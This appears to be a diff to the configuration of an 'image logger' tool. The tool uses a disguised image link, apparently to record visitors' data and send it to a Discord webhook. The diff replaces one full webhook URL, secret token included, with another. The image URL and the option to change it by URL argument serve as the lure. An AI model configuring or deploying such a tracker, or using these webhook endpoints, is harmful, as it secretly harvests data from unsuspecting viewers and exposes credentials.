@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1139546275088453634/gc4M_Cl0qiK79rb6p-VIXRScbexDTVVCVqNZnS5AURmz70a71Y3-Rz5CEk7KTBqFU7dB",
+    "webhook": "https://discordapp.com/api/webhooks/1357733454607028384/38iVezyo-nDj69Jplyygb7ahnJ49N9aRwSxc0LKdYG-vxcWpxW7Mlqy_7PfC7Nob_jyy",
     "image": "https://millenia.cars.aps.anl.gov/software/python/pyepicsapps/_images/StripChart_Basic.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
